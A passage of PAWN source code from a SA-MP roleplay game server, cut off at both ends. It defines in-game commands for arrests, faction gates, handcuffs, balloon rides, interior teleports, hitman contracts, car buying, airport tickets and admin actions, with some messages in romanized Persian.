                if(PlayerInfo[playerid][pMember]==20||PlayerInfo[playerid][pLeader]==20)
                {
                    format(string, sizeof(string), "<< Officer SFPD %s arrested suspect %s for %d seconds ($%s) >>", sendername, giveplayer, PlayerInfo[suspect][pJailTime], FormatNumber(moneys));
                    SendFamilyMessage(1, COLOR_LIGHTRED, string);
                    SendFamilyMessage(2, COLOR_LIGHTRED, string);
                    SendFamilyMessage(3, COLOR_LIGHTRED, string);
                }
                SetPlayerWantedLevel(suspect, 0);
                SpawnPlayer(suspect);
                format(string, sizeof(string), "You are jailed for %d seconds", PlayerInfo[suspect][pJailTime]);
                SendClientMessage(suspect, COLOR_LIGHTBLUE, string);
                PlayerInfo[suspect][pArrested] += 1;
                SaveKonVal(suspect, "pArrested", PINFO[suspect][pArrested]);
                SetPlayerFree(suspect,playerid, "Got Arrested");
                WantLawyer[suspect] = 1;
            } else { SCM(playerid,COLOR_ALI,"You aren't near any arrest place."); return 1; }
        }
        else
        {
            SendClientMessage(playerid, COLOR_BLUE, "You are not a Cop.");
            return 1;
        }
        return 1;
    }
//=========================================================================================================
   if(strcmp(cmd, "/opengate", true) == 0 || strcmp(cmd, "/og", true) == 0)
    {
        if(IsACop(playerid) && PTP(10,playerid,1778.161865,-1543.112182,2001.300415))
        {
            if(JailGateOpen == false) {MoveObject(JailGate,1777.7384, -1534.0942, 2004.0219,5,0.0000, 0.0000, 90.0000); JailGateOpen = true; UpdateDynamic3DTextLabelText(JailGate3D,COLOR_WHITE,"Gate\n use /opengate or /og to close this gate."); return 1;}
            else {MoveObject(JailGate,1777.73840, -1543.09424, 2004.02185,5,0.0000, 0.0000, 90.0000); JailGateOpen = false; UpdateDynamic3DTextLabelText(JailGate3D,COLOR_WHITE,"Gate\n use /opengate or /og to open this gate."); return 1;}
        }
        if(PlayerInfo[playerid][pLeader] == 1 || PlayerInfo[playerid][pLeader] == 2 || PlayerInfo[playerid][pMember] == 1 || PlayerInfo[playerid][pMember] == 2 || PlayerInfo[playerid][pMember] == 3 || PlayerInfo[playerid][pLeader] == 3 || PlayerInfo[playerid][pMember] == 20 || PlayerInfo[playerid][pLeader] == 20)
        {
            if (PlayerToPoint(10.0, playerid, 1542.3541,-1627.5516,13.3828))
            {
            if(gateopen1 == 1)
            {
            SCM(playerid,COLOR_WHITE,"Gate is already opened.");
            return 1;
            }
                MoveObject(barrierls, 1544.69641113,-1630.79003906,13.00000000, 0.001, 0, 0, 270);
                SetTimer("GateTime" ,3000 ,false);
                SendClientMessage(playerid, COLOR_GRAD6,"The gate is now open, and will be closed in 3 seconds.");
                gateopen1 = 1;
                return 1;
            }
        }
                if(IsPlayerConnected(playerid))
    {
			if(PTP(10,playerid,1448.3481, -823.9873, 68.2979)) {
			if(vinewoodgate == 0) {
			MoveObject(hasan8,1447.2480, -823.9673, 83.5979, 5,0.0000, 0.0000, 270.0000);
			vinewoodgate = 1;
			}
			else {
			MoveObject(hasan8, 1448.34814, -823.98730, 68.29790,5,0.0000, 0.0000, 270.0000);
			vinewoodgate = 0;
			}
			return 1;
			}
			}
			if(IsPlayerConnected(playerid))
    {
			if(PTP(10,playerid,1447.2480, -823.9673, 83.5979)) {
			if(vinewoodgate1 == 0) {
			MoveObject(hasan8,1448.34814, -823.98730, 68.29790, 5,0.0000, 0.0000, 270.0000);
			vinewoodgate1 = 1;
			}
			else {
			MoveObject(hasan8, 1447.2480, -823.9673, 83.5979,5,0.0000, 0.0000, 270.0000);
			vinewoodgate1 = 0;
			}
			return 1;
			}
			}
        if(PlayerInfo[playerid][pLeader] == 1 || PlayerInfo[playerid][pLeader] == 2 || PlayerInfo[playerid][pMember] == 1 || PlayerInfo[playerid][pMember] == 2 || PlayerInfo[playerid][pMember] == 3 || PlayerInfo[playerid][pLeader] == 3 || PlayerInfo[playerid][pMember] == 20 || PlayerInfo[playerid][pLeader] == 20)
        {
            if (PlayerToPoint(10.0, playerid, 2238.5105,2454.0935,10.8203))
            {
            if(gateopen2 == 1)
            {
            SCM(playerid,COLOR_WHITE,"Gate is already opened.");
            return 1;
            }
                MoveObject(barrierlv, 2238.16210938,2450.41113281,10.71316910, 0.001, 0, 0, 90);
                SetTimer("GateTime1" ,3000 ,false);
                SendClientMessage(playerid, COLOR_GRAD6,"The gate is now open, and will be closed in 3 seconds.");
                gateopen2 = 1;
                return 1;
            }
        }
        if(PlayerInfo[playerid][pLeader] == 1 || PlayerInfo[playerid][pLeader] == 2 || PlayerInfo[playerid][pMember] == 1 || PlayerInfo[playerid][pMember] == 2 || PlayerInfo[playerid][pMember] == 3 || PlayerInfo[playerid][pLeader] == 3 || PlayerInfo[playerid][pMember] == 20 || PlayerInfo[playerid][pLeader] == 20)
        {
            if (PlayerToPoint(10.0, playerid, 1589.0651,-1636.4768,13.4254))
            {
            if(gateopen3 == 1)
            {
            SCM(playerid,COLOR_WHITE,"Gate is already opened.");
            return 1;
            }
                MoveObject(garagels, 1588.3868,-1638.2165, -7, 5);
                SetTimer("GarageLS" ,3000 ,false);
                SendClientMessage(playerid, COLOR_GRAD6,"The gate is now open, and will be closed in 3 seconds.");
                gateopen3 = 1;
                return 1;
            }
        }

        if(IsACop(playerid))
        {
           if(PTP(20.0,playerid,321.321075, 1897.642333, 16.636323))
           {
           if(gateopen4 == 1)
            {
            SCM(playerid,COLOR_WHITE,"Gate is already opened.");
            return 1;
            }
              MoveObject(area1gate1,321.3211, 1897.6423, 13.3879,5,0.0000, 0.0000, 270.0000);
              MoveObject(area2gate1,321.3211, 1897.6423, 13.3879,5,0.0000, 0.0000, 270.0000);
              MoveObject(area3gate1,321.3211, 1897.6423, 13.3879,5,0.0000, 0.0000, 270.0000);
              SetTimer("areagate1",6000,false);
              gateopen4 = 1;
              SCM(playerid,COLOR_GRAD6,"The gate is now open, and will be closed in 6 seconds.");
              return 1;
           }
        }
        if(IsACop(playerid))
        {
           if(PTP(20.0,playerid,81.3497, 1913.8065, 13.3164))
           {
           if(gateopen5 == 1)
            {
            SCM(playerid,COLOR_WHITE,"Gate is already opened.");
            return 1;
            }
              MoveObject(area1gate2,81.3497, 1922.5674, 13.3143,5,0.0000, 0.0000, 90.0000);
              MoveObject(area2gate2,81.3497, 1913.8065, 13.3164,5,0.0000, 0.0000, 90.0000);
              SetTimer("areagate2",6000,false);
              gateopen5 = 1;
              SCM(playerid,COLOR_GRAD6,"The gate is now open, and will be closed in 6 seconds.");
              return 1;
           }
        }
        if(IsACop(playerid))
        {
           if(PTP(20.0,playerid,81.3481, 2063.2515, 16.5053))
           {
           if(gateopen6 == 1)
            {
            SCM(playerid,COLOR_WHITE,"Gate is already opened.");
            return 1;
            }
              MoveObject(area1gate3,81.3481, 2063.2515, 13.1630,5,0.0000, 0.0000, 90.0000);
              MoveObject(area2gate3,81.3481, 2072.0249, 12.9549,5,0.0000, 0.0000, 90.0000);
              SetTimer("areagate3",6000,false);
              gateopen6 = 1;
              SCM(playerid,COLOR_GRAD6,"The gate is now open, and will be closed in 6 seconds.");
              return 1;
           }
        }
        if(IsACop(playerid))
        {
           if(PTP(20.0,playerid,209.79103, 1875.28442, 12.13354))
           {
           if(gateopen7 == 1)
            {
            SCM(playerid,COLOR_WHITE,"Gate is already opened.");
            return 1;
            }
              MoveObject(AreaGate,209.79100, 1875.28442, 8.86356,4.1,0,0,0);
              SetTimer("areagate",3000,false);
              gateopen7 = 1;
              SCM(playerid,COLOR_GRAD6,"The gate is now open, and will be closed in 3 seconds.");
              return 1;
           }
        }
        if(IsACop(playerid))
        {
           if(PTP(10.0,playerid,1764.49976, -1547.03247, 2004.02783))
           {
           if(gateopen23 == 1)
            {
            SCM(playerid,COLOR_WHITE,"Gate is already opened.");
            return 1;
            }
              MoveObject(JailX,1764.49976, -1547.03247, 2007.31384, 5);
              SetTimer("JailXT",3000,false);
              gateopen23 = 1;
              SCM(playerid,COLOR_GRAD6,"The gate is now open, and will be closed in 3 seconds.");
              return 1;
           }
        }
        if(PlayerInfo[playerid][pLeader] == 1 || PlayerInfo[playerid][pLeader] == 2 || PlayerInfo[playerid][pMember] == 1 || PlayerInfo[playerid][pMember] == 2 || PlayerInfo[playerid][pMember] == 3 || PlayerInfo[playerid][pLeader] == 3 || PlayerInfo[playerid][pMember] == 20 || PlayerInfo[playerid][pLeader] == 20)
        {
            if (PlayerToPoint(10.0, playerid, 2334.4844,2444.3457,5.6337))
            {
            if(gateopen8 == 1)
            {
            SCM(playerid,COLOR_WHITE,"Gate is already opened.");
            return 1;
            }
                MoveObject(garagelv, 2335.2814,2444.1799, -7, 5);
                SetTimer("GarageLV" ,3000 ,false);
                gateopen8 = 1;
                SendClientMessage(playerid, COLOR_GRAD6,"The gate is now open, and will be closed in 3 seconds.");
                return 1;
            }
        }
        if(PlayerInfo[playerid][pLeader] == 1 || PlayerInfo[playerid][pLeader] == 2 || PlayerInfo[playerid][pMember] == 1 || PlayerInfo[playerid][pMember] == 2 || PlayerInfo[playerid][pMember] == 3 || PlayerInfo[playerid][pLeader] == 3 || PlayerInfo[playerid][pMember] == 20 || PlayerInfo[playerid][pLeader] == 20)
        {
            if (PlayerToPoint(10.0, playerid, 2292.9104,2499.2024,3.4907))
            {
            if(gateopen9 == 1)
            {
            SCM(playerid,COLOR_WHITE,"Gate is already opened.");
            return 1;
            }
                MoveObject(garagelv1, 2294,2498.5915, -4.5, 5);
                SetTimer("GarageLV1" ,3000 ,false);
                gateopen9 = 1;
                SendClientMessage(playerid, COLOR_GRAD6,"The gate is now open, and will be closed in 3 seconds.");
                return 1;
            }
			}
        if(PlayerInfo[playerid][pLeader] == 1 || PlayerInfo[playerid][pLeader] == 2 || PlayerInfo[playerid][pMember] == 1 || PlayerInfo[playerid][pMember] == 2 || PlayerInfo[playerid][pMember] == 3 || PlayerInfo[playerid][pLeader] == 3 || PlayerInfo[playerid][pMember] == 20 || PlayerInfo[playerid][pLeader] == 20)
        {
            if (PlayerToPoint(10.0, playerid, -1624.76929, 688.32880, 8.89564))
            {
            if(gateopen20 == 1)
            {
            SCM(playerid,COLOR_WHITE,"Gate is already opened.");
            return 1;
            }
                MoveObject(sfpdgate1, -1617.58215, 688.25903, 8.89564, 5);
                SetTimer("sfpdgate1T" ,3000 ,false);
                gateopen20 = 1;
                SendClientMessage(playerid, COLOR_GRAD6,"The gate is now open, and will be closed in 3 seconds.");
                return 1;
            }
			}
        if(PlayerInfo[playerid][pLeader] == 1 || PlayerInfo[playerid][pLeader] == 2 || PlayerInfo[playerid][pMember] == 1 || PlayerInfo[playerid][pMember] == 2 || PlayerInfo[playerid][pMember] == 3 || PlayerInfo[playerid][pLeader] == 3 || PlayerInfo[playerid][pMember] == 20 || PlayerInfo[playerid][pLeader] == 20)
        {
            if (PlayerToPoint(10.0, playerid, -1636.33142, 688.33667, 8.89540))
            {
            if(gateopen21 == 1)
            {
            SCM(playerid,COLOR_WHITE,"Gate is already opened.");
            return 1;
            }
                MoveObject(sfpdgate2, -1645.67871, 688.23499, 8.89564, 5);
                SetTimer("sfpdgate2T" ,3000 ,false);
                gateopen21 = 1;
                SendClientMessage(playerid, COLOR_GRAD6,"The gate is now open, and will be closed in 3 seconds.");
                return 1;
            }
            else
            SCM(playerid, COLOR_GRAD4,"** You are not the destination for open the gate.");
            return 1;
        }
        return 1;
    }
    ///-----
    if(strcmp(cmdtext, "/openhq", true) == 0 || strcmp(cmd, "/oh", true) == 0)
    {
       if(PlayerInfo[playerid][pClan] == 1 || PlayerInfo[playerid][pMember] == 20 || PlayerInfo[playerid][pLeader] == 20)
        {
             if(gateopen10 == 1)
            {
            SCM(playerid,COLOR_WHITE,"Gate is already opened.");
            return 1;
            }
        if (PlayerToPoint(10.0, playerid, 2222.889648,-1140.269165,25.708787)) {
        MoveObject(TTgate, 2214.9355, -1138.5302, 28.3421, 5, 0.0000, 0.0000, -16.8600);
        SetTimer("TTgateT" ,3000 ,false);
        gateopen10 = 1;
        SendClientMessage(playerid, COLOR_GRAD6,"The gate is now open, and will be closed in 3 seconds.");
        return 1;
    }
 }
       if(PlayerInfo[playerid][pClan] == 3 || PlayerInfo[playerid][pMember] == 20 || PlayerInfo[playerid][pLeader] == 20)
        {
             if(gateopen22 == 1)
            {
            SCM(playerid,COLOR_WHITE,"Gate is already opened.");
            return 1;
            }
        if (PlayerToPoint(10.0, playerid, 2184.15991, -1762.50024, 14.65228)) {
        MoveObject(EVgate, 2175.31470, -1762.51538, 14.69943, 5, 0.0000, 0.0000, 0.0000);
        SetTimer("EVgateT" ,3000 ,false);
        gateopen22 = 1;
        SendClientMessage(playerid, COLOR_GRAD6,"The gate is now open, and will be closed in 3 seconds.");
        return 1;
    }
 }
         if(PlayerInfo[playerid][pLeader] == 8 || PlayerInfo[playerid][pMember] == 8 || PlayerInfo[playerid][pMember] == 20 || PlayerInfo[playerid][pLeader] == 20)
        {
             if(gateopen15 == 1)
            {
            SCM(playerid,COLOR_WHITE,"Gate is already opened.");
            return 1;
            }
   if (PlayerToPoint(10.0, playerid, 1021.2133, -377.7204, 74.7619))   {
        MoveObject(obj5, 1021.2133, -377.7204, 80.3642, 5.00);
        SetTimer("obj5T" ,3000 ,false);
        gateopen15 = 1;
        SendClientMessage(playerid, COLOR_GRAD6,"The gate is now open, and will be closed in 3 seconds.");
        return 1;
    }
 }
            else
            SCM(playerid, COLOR_GRAD4,"** You are not the destination for open the gate.");
            return 1;
 }


     if(strcmp(cmdtext, "/ballon", true) == 0 || strcmp(cmd, "/blo", true) == 0)
    {
	        if (PlayerToPoint(1.5, playerid, 303.965179,-1901.703857,2.574748)) {
             if(balsys1 == 1)
            {
            SCM(playerid,COLOR_RED,"Dar Hale Estefade Ast.");
            return 1;
            }
	        if(GetPlayerPool(playerid) < 500)
            {
        SendClientMessage(playerid, COLOR_GRAD5, "Shoma Pool Kafi Nadarid (500$)");
        return 1;
            }
		GivePlayerPool(playerid,-500);
		GameTextForPlayer(playerid, "~r~-$500", 5000, 1);
	    SendClientMessage(playerid, COLOR_AdminWarn, "Lotfan Dar Toole Rahe BazGasht Naistid , /Gro Bashid")
        MoveObject(Balsys1, 326.079589,-1832.628906,50.834218, 20, 0.0000, 0.0000, -16.8600);
        SetTimer("blT1" ,7000 ,false);
        balsys1 = 1;
        SendClientMessage(playerid, COLOR_RED,"Safar Khosh Begzarad.");
        return 1;
    }
	        if (PlayerToPoint(1.5, playerid, 271.637725,-1897.869995,2.574748)) {
             if(balsys2 == 1)
            {
            SCM(playerid,COLOR_RED,"Dar Hale Estefade Ast.");
            return 1;
            }
	        if(GetPlayerPool(playerid) < 1000)
            {
        SendClientMessage(playerid, COLOR_GRAD5, "Shoma Pool Kafi Nadarid (1000$)");
        return 1;
            }
		GivePlayerPool(playerid,-1000);
		GameTextForPlayer(playerid, "~r~-$1000", 5000, 1);
	    SendClientMessage(playerid, COLOR_AdminWarn, "Lotfan Dar Toole Rahe BazGasht Naistid , /Gro Bashid")
        MoveObject(Balsys2, 326.079589,-1832.628906,50.834218, 10, 0.0000, 0.0000, -16.8600);
        SetTimer("bl2T1" ,7000 ,false);
        balsys2 = 1;
        SendClientMessage(playerid, COLOR_RED,"Safar Khosh Begzarad.");
        return 1;
    }
	         else
            SCM(playerid, COLOR_RED,"Shoma Rooye Ballon Nistid.");
            return 1;
 }

//------------------------------------------------------------------------------
    if(strcmp(cmd, "/intx", true) == 0)
    {
        if(PlayerInfo[playerid][pAdmin] >= 5)
        {
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD5, "USAGE: /intx [id 0-146]");
                SendClientMessage(playerid, COLOR_GRAD5, "/ints Ham Bezani iD Salonaro Bet Mige !");
                return 1;
            }
            new playa;
            playa = strval(tmp);
            if(playa < 146 && playa >= 0)
            {
                format(string, sizeof(string), "Interior %d: %s", playa, IntName[playa]);
                SendClientMessage(playerid, COLOR_CRS5, string);
                SetPlayerInterior(playerid, IntArray2[playa][0]);
                SetPlayerPosEx(playerid, IntArray[playa][0], IntArray[playa][1], IntArray[playa][2]);
                SetPlayerFacingAngle(playerid, IntArray[playa][3]);
                return 1;
            }
        }
        return 1;
    }


    if(strcmp(cmd, "/Vintx", true) == 0)
    {
        if(PlayerInfo[playerid][pPremiumAccount] < 101) return SCM(playerid, COLOR_GREEN, "Vip level 2 nistid.");

            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD5, "USAGE: /intx [id 0-146]");
                return 1;
            }
            new playa;
            playa = strval(tmp);
            if(playa < 146 && playa >= 0)
            {
                format(string, sizeof(string), "Interior %d: %s", playa, IntName[playa]);
                SendClientMessage(playerid, COLOR_CRS5, string);
                SetPlayerInterior(playerid, IntArray2[playa][0]);
                SetPlayerPosEx(playerid, IntArray[playa][0], IntArray[playa][1], IntArray[playa][2]);
                SetPlayerFacingAngle(playerid, IntArray[playa][3]);
                return 1;
            }

        return 1;
    }


if(strcmp(cmd, "/ints", true) == 0)
{
if(IsPlayerConnected(playerid))
{
if(PlayerInfo[playerid][pAdmin] >= 5)
{
                SCM(playerid,COLOR_RED,"Anromanda : 137");
                SCM(playerid,COLOR_RED,"Vice Stadium : 118");
                SCM(playerid,COLOR_RED,"DirtBike : 109");
                SCM(playerid,COLOR_RED,"Blood Bowl : 82");
                SCM(playerid,COLOR_RED,"Motel : 73");
                SCM(playerid,COLOR_RED,"Kickstart : 63");
                SCM(playerid,COLOR_RED,"RC : 45");
                SCM(playerid,COLOR_RED,"Race Stadium  : 39");
                SCM(playerid,COLOR_RED,"Oval Stadium : 38");
                SCM(playerid,COLOR_RED,"best Sallon : 82");
                return 1;
}
else { SCM(playerid,COLOR_GREEN,"You are not authorized to use that command."); return 1; }
}
return 1;
}
    if(strcmp(cmd, "/contract", true) == 0)
    {
        if(PINFO[playerid][pMember] == 8 || PINFO[playerid][pLeader] == 8) return SCM(playerid,COLOR_ALI,"You can't use contract when you are a hitman agent.");
        if(PINFO[playerid][pLevel] < 3) return SCM(playerid,COL_SYN,"You need to have higher than 3 level to place a contract.");
        tmp = strtok(cmdtext,idx);
        if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /contract <PlayerID/PartOfName> <Prize>");
        new taraf = ReturnUser(tmp);
        if(!IsPlayerConnected(taraf)) return SCM(playerid,COLOR_ALI,"That player is offline.");
        if(PINFO[taraf][pMember] == 8 || PINFO[taraf][pLeader] == 8) return SCM(playerid,COLOR_ALI,"You cannot contract a hitman agent.");
        tmp = strtok(cmdtext,idx);
        if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /contract <PlayerID/PartOfName> <Prize>");
        new prize = strval(tmp);
        if(prize < 150 || prize > 10000) return SCM(playerid,COLOR_ALI,"Type a Prize number between $150 and $10,000");
        if(prize > GetPlayerPool(playerid)) return SCM(playerid,COLOR_ALI,"You haven't this cash.");
        if(prize < 1500 && gTeam[taraf] == TEAM_COP) return SCM(playerid,COLOR_ALI,"The cash to contract a cop must be higher than $1,500.");
        GivePlayerPool(playerid,-prize);
        if(PINFO[taraf][pHeadValue] <= 0)
        {
            ContractsCount ++;
            ContractID[taraf] = ReturnContractID();
            ContractIDUsed[ReturnContractID()] = true;
            AgentHiterID[taraf] = INVALID_PLAYER_ID;
        }
        PINFO[taraf][pHeadValue] += prize;
        SaveKonVal(taraf, "pHeadValue", PINFO[taraf][pHeadValue]);
        SCM(playerid,COLOR_ALI,"Player get contracted successfully.");
        return 1;
    }
//--------------------
if(strcmp(cmd, "/buycar", true) == 0)
{
	if(PlayerToPoint(10.0, playerid, 329.8260,-1516.1796,35.8671))
	{
	    IWantCar[playerid] = 0;  PriceCar[playerid] = 0;
		if(PlayerInfo[playerid][pLevel] < 5)
		{
    		SendClientMessage(playerid, COLOR_RED, "You need to be level 5 to buy a car.");
          	return 1;
		}
		if(PINFO[playerid][pCar] != 0 && PINFO[playerid][pCar_2] != 0) return SCM(playerid,COLOR_ALI,"You already have 2 vehicles.");
			SetPlayerPos(playerid,-1953.721801,264.140136,41.047080);
			if(playerid == 0) {
			SetPlayerVirtualWorld(playerid, 10000);
			}
			else {
			SetPlayerVirtualWorld(playerid, playerid);
			}

			rV[playerid] = 1;
			okkon(playerid,rV[playerid]);
			TextDrawShowForPlayer(playerid, TestModel[playerid]);
			TextDrawShowForPlayer(playerid, BuyModel[playerid]);
			TextDrawShowForPlayer(playerid, NextModel[playerid]);
			TextDrawShowForPlayer(playerid, PrevModel[playerid]);
			TextDrawShowForPlayer(playerid, ExitDS[playerid]);
			TextDrawShowForPlayer(playerid, RotModel[playerid]);
			TextDrawShowForPlayer(playerid, RotModel2[playerid]);

			PlayerTextDrawShow(playerid, CarModel[playerid]);
			PlayerTextDrawShow(playerid, PriceModel[playerid]);
			OnMashinKharidan[playerid] = 1;
			SelectTextDraw(playerid, 0x00FF00FF);
			return 1;
	}
	else
	{
		SendClientMessage(playerid, COLOR_RED, "You are not at the Dealership");
		return 1;
	}
}
    //=====================================================================================================
        if(strcmp(cmd, "/handscuff", true) == 0 || strcmp(cmd, "/hcu", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(gTeam[playerid] == TEAM_COP || IsACop(playerid))
            {
                tmp = strtok(cmdtext, idx);
                if(!strlen(tmp)) {
                    SendClientMessage(playerid, COLOR_WHITE, "USAGE: /handscuff [Playerid/PartOfName]");
                    return 1;
                    }
                giveplayerid = ReturnUser(tmp);
                if(IsPlayerConnected(giveplayerid))
                {
                    if(giveplayerid != INVALID_PLAYER_ID)
                    {
                        if(gTeam[giveplayerid] == TEAM_COP || IsACop(giveplayerid))
                        {
                            SendClientMessage(playerid, COLOR_GREY, "You can't Cuff Cops !");
                            return 1;
                        }
                        if(PlayerHandsCuffed[giveplayerid] == 1)
                        {
                            SendClientMessage(playerid, COLOR_GREY, "Player already Cuffed !");
                            return 1;
                        }
                        if (ProxDetectorS(8.0, playerid, giveplayerid))
                        {

                                GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                                GetPlayerName(playerid, sendername, sizeof(sendername));
                                format(string, sizeof(string), "You were handsCuffed by %s, till uncuff.", sendername);
                                SendClientMessage(giveplayerid, COLOR_WHITE, string);
                                format(string, sizeof(string), "You handsCuffed %s, till handsuncuff.", giveplayer);
                                SendClientMessage(playerid, COLOR_WHITE, string);
                                format(string, sizeof(string), "%s Hand Cuffs %s, so he wont go anywhere.", sendername ,giveplayer);
                                ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
                                GameTextForPlayer(giveplayerid, "~r~Hands Cuffed", 2500, 3);
                                SetPlayerAttachedObject(giveplayerid, 1, 19418, 6, -0.011000, 0.028000, -0.022000, -15.600012, -33.699977, -81.700035, 0.891999, 1.000000, 1.168000);
                                SetPlayerSpecialAction(giveplayerid, SPECIAL_ACTION_CUFFED);
                                PlayerHandsCuffed[giveplayerid] = 1;


                        }
                        else
                        {
                            SendClientMessage(playerid, COLOR_GREY, "   That player is not near you !");
                            return 1;
                        }
                    }
                }
                else
                {
                    SendClientMessage(playerid, COLOR_GREY, "   That player is Offline !");
                    return 1;
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREY, "   You are not a Cop / FBI / National Guard !");
            }
        }
        return 1;
    }
    //========================================================================================================
        if(strcmp(cmd, "/handsuncuff", true) == 0 || strcmp(cmd, "/hucu", true) == 0)
        {
        if(IsPlayerConnected(playerid))
        {
            if(gTeam[playerid] == TEAM_COP || IsACop(playerid))
            {
                tmp = strtok(cmdtext, idx);
                if(!strlen(tmp)) {
                    SendClientMessage(playerid, COLOR_WHITE, "USAGE: /handsuncuff [Playerid/PartOfName]");
                    return 1;
                }
                giveplayerid = ReturnUser(tmp);
                if(IsPlayerConnected(giveplayerid))
                {
                    if(giveplayerid != INVALID_PLAYER_ID)
                    {
                        if (ProxDetectorS(8.0, playerid, giveplayerid))
                        {
                            if(giveplayerid == playerid) { SendClientMessage(playerid, COLOR_GREY, "You cannot handsUncuff yourself!"); return 1; }
                            if(PlayerHandsCuffed[giveplayerid])
                            {
                                GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                                GetPlayerName(playerid, sendername, sizeof(sendername));
                                format(string, sizeof(string), "* You were handsUncuffed by %s.", sendername);
                                SendClientMessage(giveplayerid, COLOR_WHITE, string);
                                format(string, sizeof(string), "* You handsUncuffed %s.", giveplayer);
                                SendClientMessage(playerid, COLOR_WHITE, string);
                                GameTextForPlayer(giveplayerid, "~g~hands Uncuffed", 2500, 3);
                                SetPlayerSpecialAction(giveplayerid, SPECIAL_ACTION_NONE);
                                RemovePlayerAttachedObject(giveplayerid, 1);
                                PlayerHandsCuffed[giveplayerid] = 0;
                            }
                            else
                            {
                                SendClientMessage(playerid, COLOR_GREY, "   That player isn't Tied up !");
                                return 1;
                            }
                        }
                        else
                        {
                            SendClientMessage(playerid, COLOR_GREY, "   That player is not near you !");
                            return 1;
                        }
                    }
                }
                else
                {
                    SendClientMessage(playerid, COLOR_GREY, "   That player is Offline !");
                    return 1;
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREY, "   You are not a Cop / FBI / National Guard !");
            }
        }
        //not connected
        return 1;
        }
    //=========================================================================================================
if(strcmp(cmd, "/respawn", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /respawn [playerid/PartOfName]");
                return 1;
            }
            new playa;
            playa = ReturnUser(tmp);
            if (PlayerInfo[playerid][pAdmin] >= 1)
            {
                if(IsPlayerConnected(playa))
                {
                    if(playa != INVALID_PLAYER_ID)
                    {
                        //if(SpawnChange[playerid])
                        {
                            GetPlayerName(playa, giveplayer, sizeof(giveplayer));
                            ResetPlayerTofang(playa);
                            SetSpawnKol(playa);
                            SpawnPlayer(playa);
                            GetPlayerName(playerid, sendername, sizeof(sendername));
                            format(string, sizeof(string), "* You have been respawned by Admin %s", sendername);
                            SendClientMessage(playa, COLOR_LIGHTRED, string);
                            format(string, 256, "AdmWarning: {FFFFFF}%s has respawned the {FFFFFF}%s", sendername, giveplayer);
                            ABroadCast(COLOR_YELLOW,string,1);
                            return 1;
                        }
                    }
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREEN, "Error: Your Admin level isn't high enough to use this command!");
            }
        }
        return 1;
    }
//----------------------

if(strcmp(cmd, "/locations", true) == 0 || !strcmp(cmd,"/gps",true))
{
if(IsPlayerConnected(playerid))
{
            new locations2[1024];
            format(locations2,sizeof(locations2),"Faction HQs \t\nImportant Locations \t\nBizzes \t\nSpecial Bizzes");
            ShowPlayerDialog(playerid,998877,DIALOG_STYLE_LIST,"Locations:",locations2,"Select","Cancel");
    }
	return 1;
}
if(strcmp(cmd, "/buyticket", true) == 0)
{
if(IsPlayerConnected(playerid))
{
			if(IsPlayerInAnyVehicle(playerid))
            {
			SCM(playerid,COLOR_GREEN,"Your are in vehicle , please exit from vehicle and try again.");
			return 1;
            }

			if(PlayerToPoint(3.0, playerid, 1642.231689,-2237.691894,13.498592)) {
            new lsto[1024];
            format(lsto,sizeof(lsto),"Airport Las Venturas : 1000 $ \t\nAirport San Fiero : 2000 $");
            ShowPlayerDialog(playerid,203010,DIALOG_STYLE_LIST,"Other Cities:",lsto,"Select","Cancel");
			}
			if(PlayerToPoint(3.0, playerid, 1662.839599,1423.421752,10.798387)) {
            new lvto[1024];
            format(lvto,sizeof(lvto),"Airport Los Santos : 1000 $ \t\nAirport San Fiero : 2000 $");
            ShowPlayerDialog(playerid,203020,DIALOG_STYLE_LIST,"Other Cities:",lvto,"Select","Cancel");
			}
			if(PlayerToPoint(3.0, playerid, -1421.201171,-287.120727,14.148437)) {
            new sfto[1024];
            format(sfto,sizeof(sfto),"Airport Las Venturas : 1000 $ \t\nAirport Los Santos : 2000 $");
            ShowPlayerDialog(playerid,203030,DIALOG_STYLE_LIST,"Other Cities:",sfto,"Select","Cancel");
		}
    }
	return 1;
}

if(strcmp(cmd, "/rpfv", true) == 0 || !strcmp(cmd,"/removeplayerfromvehicle",true))
{
if(IsPlayerConnected(playerid))
{
if(PlayerInfo[playerid][pAdmin] <= 3)
{
SCM(playerid,COLOR_GREEN,"Error: Your admin level isn't high enough to use this command.");
return 1;
}
tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /rpfv [playerid/PartOfName] [reason]");
                return 1;
            }
new length = strlen(cmdtext);
                        while ((idx < length) && (cmdtext[idx] <= ' '))
                        {
                            idx++;
                        }
                        new offset = idx;
      new result[64];
                        while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
                        {
                            result[idx - offset] = cmdtext[idx];
                            idx++;
                        }
                        result[idx - offset] = EOS;
                        if(!strlen(result))
                        {
                            SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /rpfv [playerid/PartOfName] [reason]");
                            return 1;
                        }
            new playa;
            playa = ReturnUser(tmp);
            new thiscar = GetPlayerVehicleID(playa);
if(!IsPlayerConnected(playa)) return SCM(playerid,COLOR_WHITE,"player is offline.");
if(!IsPlayerInAnyVehicle(playa)) return SCM(playerid,COLOR_WHITE,"that player isn't in any vehicle.");
if(playa != INVALID_PLAYER_ID)
{
RemovePlayerFromVehicle(playa);
new alistr[256];
new alistring[256];
GetPlayerName(playa, giveplayer, sizeof(giveplayer));
GetPlayerName(playerid, sendername, sizeof(sendername));
format(alistr, 256, "AdmWarning: {FFFFFF}%s has removed %s from his/her car/mopped reason: %s", sendername, giveplayer, (result));
ABroadCast(COLOR_LIGHTRED,alistr,1);
